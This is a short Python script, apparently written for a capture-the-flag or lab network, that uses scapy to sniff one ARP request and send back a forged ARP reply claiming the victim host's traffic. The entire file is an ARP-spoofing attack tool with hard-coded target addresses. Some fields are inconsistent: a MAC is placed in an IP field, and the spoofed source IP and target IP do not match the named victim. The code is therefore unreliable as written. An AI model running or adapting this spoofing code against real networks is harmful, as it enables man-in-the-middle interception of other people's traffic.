﻿#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid
# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])


hijackedip = "10.6.6.35"
hijackedhw = "4c:24:57:ab:ed:84"

myip = "10.6.0.3"
myhw = "02:42:0a:06:00:03"



def handle_arp_packets(packet):
    # if arp request, then we need to fill this out to send back our mac as the response
    if ARP in packet and packet[ARP].op == 1:
        ether_resp = Ether(dst="02:42:0a:06:00:06", type=0x806, src=macaddr)
        arp_response = ARP(pdst="02:42:0a:06:00:06")
        
        # Opcode (reply) "is-at"
        arp_response.op = 2

        # Protocol size
        arp_response.plen = 4

        # Hardware size
        arp_response.hwlen = 6

        # Protocol type is IPv4 
        arp_response.ptype = 0x800
        
        # Hardware type: Ethernet 
        arp_response.hwtype = 1

        arp_response.hwsrc = macaddr
        arp_response.psrc = ipaddr
        arp_response.hwdst = hijackedhw
        arp_response.pdst = "10.10.10.2"
        response = ether_resp/arp_response
        sendp(response, iface="eth0")
def main():
    # We only want arp requests
    berkeley_packet_filter = "(arp[6:2] = 1)"
    # sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

if __name__ == "__main__":
    main()